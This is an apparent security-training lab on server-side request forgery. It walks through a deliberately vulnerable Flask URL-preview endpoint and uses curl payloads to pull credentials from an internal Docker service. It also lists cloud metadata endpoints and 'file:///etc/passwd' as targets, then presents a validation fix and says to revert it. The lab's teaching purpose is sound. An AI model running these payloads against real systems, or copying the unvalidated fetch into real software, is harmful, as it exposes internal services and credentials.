# Lab 6 — SSRF (Server-Side Request Forgery)

## Overview

Server-Side Request Forgery (SSRF) occurs when an application fetches a URL provided by the user without proper validation. The server makes the request on behalf of the attacker, effectively acting as a proxy into the internal network.

This is dangerous because:
- The server often has access to internal services, metadata endpoints, and databases that are not exposed to the internet
- Internal services typically have no authentication because they rely on network-level access control
- Cloud metadata endpoints (e.g., AWS `169.254.169.254`) can expose credentials and configuration

In this lab, the app has a "URL Preview" feature that fetches any URL. We'll use it to access an internal API that contains production credentials.

## Step 1 — Analyze the Code

Open `app/app.py` and look at the `/preview` endpoint (lines ~10-20):

```python
@app.route('/preview', methods=['POST'])
def preview():
    url = request.form['url']
    try:
        # VULNERABLE: No URL validation, fetches any URL including internal services
        response = http_requests.get(url, timeout=5)
        content = response.text
        content_type = response.headers.get('Content-Type', '')
        status_code = response.status_code
    except Exception as e:
        return render_template('index.html', error=str(e), url=url)

    return render_template('preview.html', content=content, url=url, ...)
```

**Why this is vulnerable:** The user-supplied `url` is passed directly to `requests.get()` with zero validation:
- No scheme restriction (allows `http://`, `file://`, `gopher://`, etc.)
- No hostname/IP restriction (allows `localhost`, `127.0.0.1`, internal IPs, Docker service names)
- No blocklist for private IP ranges

Now look at `docker-compose.yml`:
```yaml
services:
  web:
    ...
    depends_on:
      - internal-api

  internal-api:
    build:
      context: .
      dockerfile: Dockerfile.internal
    # No ports mapped to host — only accessible from within the Docker network
```

The `internal-api` service is on the same Docker network as the web app but has **no port mapping** — it's completely invisible from the host. Only other containers on the same Docker network can reach it.

Open `internal-service/app.py` to see what it exposes:
```python
@app.route('/admin/credentials')
def credentials():
    return jsonify({
        "database": {"host": "db.internal", "user": "root", "password": "pr0d_p@ssw0rd!"},
        "api_keys": {"stripe": "sk_live_...", "aws_access_key": "AKIA..."},
        "internal_note": "This service should never be exposed to the internet."
    })
```

## Step 2 — Exploit the Vulnerability

### Prerequisites
- Start the lab: `docker compose up --build`
- App is at: `http://localhost:5006`
- `internal-api` is NOT accessible from your machine (no port mapping)

### Step 2.1 — Normal usage (verify app works)

1. Go to `http://localhost:5006`
2. Enter `http://example.com` in the URL field
3. Click "Fetch Preview"
4. You see the HTML content of example.com displayed

[Screenshot: Preview result showing example.com HTML content]

### Step 2.2 — Verify internal service is not directly accessible

Try to access the internal service directly from your machine:

```bash
curl http://localhost:8080/admin/credentials
# Connection refused — the service has no port mapping
```

This confirms the internal API is not exposed to the internet.

### Step 2.3 — Exploit SSRF to access internal service

1. Go to `http://localhost:5006`
2. Enter the following URL: `http://internal-api:8080/admin/credentials`
3. Click "Fetch Preview"

The server fetches this URL from inside the Docker network, where `internal-api` resolves to the internal service container.

The preview shows the internal credentials JSON:

```json
{
  "database": {
    "host": "db.internal",
    "port": 5432,
    "user": "root",
    "password": "pr0d_p@ssw0rd!"
  },
  "api_keys": {
    "stripe": "sk_live_4eC39HqLyjWDarjtT1zdp7dc",
    "aws_access_key": "AKIAIOSFODNN7EXAMPLE",
    "aws_secret_key": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
  },
  "internal_note": "This service should never be exposed to the internet. Contains production credentials."
}
```

[Screenshot: Preview showing the internal credentials JSON in the browser]

### Step 2.4 — Exploit via curl

```bash
curl -X POST http://localhost:5006/preview \
  -d "url=http://internal-api:8080/admin/credentials"
```

The response HTML will contain the credentials JSON.

### Step 2.5 — Additional SSRF payloads to try

```bash
# Access the internal service's health endpoint
curl -X POST http://localhost:5006/preview -d "url=http://internal-api:8080/health"

# Access the internal service root
curl -X POST http://localhost:5006/preview -d "url=http://internal-api:8080/"

# In a cloud environment, you could also try:
# url=http://169.254.169.254/latest/meta-data/  (AWS metadata)
# url=http://metadata.google.internal/  (GCP metadata)
```

## Step 3 — Discuss & Implement the Fix

### The Problem
The server fetches any user-supplied URL without validation, allowing access to internal network resources.

### The Fix
Implement URL validation that blocks requests to internal/private IP addresses and restricts allowed schemes.

**Before** (`app/app.py`, lines ~11-13):
```python
url = request.form['url']
response = http_requests.get(url, timeout=5)
```

**After:**
```python
from urllib.parse import urlparse
import ipaddress
import socket

def is_safe_url(url):
    try:
        parsed = urlparse(url)

        # Only allow http and https schemes
        if parsed.scheme not in ('http', 'https'):
            return False, "Only HTTP and HTTPS URLs are allowed"

        hostname = parsed.hostname
        if not hostname:
            return False, "Invalid URL"

        # Resolve the hostname to an IP address
        ip = socket.gethostbyname(hostname)
        ip_obj = ipaddress.ip_address(ip)

        # Block private, loopback, and reserved IP ranges
        if ip_obj.is_private or ip_obj.is_loopback or ip_obj.is_reserved:
            return False, "Access to internal addresses is not allowed"

        return True, None
    except Exception as e:
        return False, str(e)

@app.route('/preview', methods=['POST'])
def preview():
    url = request.form['url']

    safe, error = is_safe_url(url)
    if not safe:
        return render_template('index.html', error=error, url=url)

    try:
        response = http_requests.get(url, timeout=5)
        ...
```

### Why This Works
1. **Scheme restriction:** Only allows `http://` and `https://` — blocks `file://`, `gopher://`, etc.
2. **DNS resolution:** Resolves the hostname to an IP address BEFORE making the request
3. **IP validation:** Blocks all private (10.x, 172.16-31.x, 192.168.x), loopback (127.x), and reserved IP ranges using Python's `ipaddress` module

When an attacker tries `http://internal-api:8080/admin/credentials`:
1. The hostname `internal-api` resolves to a Docker internal IP (e.g., `172.18.0.3`)
2. `172.18.0.3` is in the `172.16.0.0/12` private range
3. `ip_obj.is_private` returns `True`
4. The request is blocked with "Access to internal addresses is not allowed"

**Note on DNS rebinding:** A sophisticated attacker might try DNS rebinding (hostname resolves to a public IP during validation but to a private IP during the actual request). For production, consider also validating at the network level (e.g., firewall rules on the container) and re-checking the resolved IP after the request.

## Step 4 — Verify the Fix

1. Apply the fix in `app/app.py`: add the `is_safe_url` function and the validation check
2. Restart: `docker compose down && docker compose up --build`
3. Attempt the SSRF attack:
   - Enter `http://internal-api:8080/admin/credentials` in the URL field
   - Result: Error message "Access to internal addresses is not allowed"

4. Try other SSRF payloads:
   - `http://127.0.0.1:5006/` → Blocked (loopback)
   - `http://localhost:5006/` → Blocked (loopback)
   - `http://10.0.0.1/` → Blocked (private range)
   - `file:///etc/passwd` → Blocked (scheme not allowed)

5. Verify normal functionality:
   - Enter `http://example.com` → Works correctly, shows preview
   - Enter `https://httpbin.org/get` → Works correctly

[Screenshot: Error message "Access to internal addresses is not allowed" when attempting SSRF]

**Remember to revert the fix** so the lab ships in its vulnerable state.
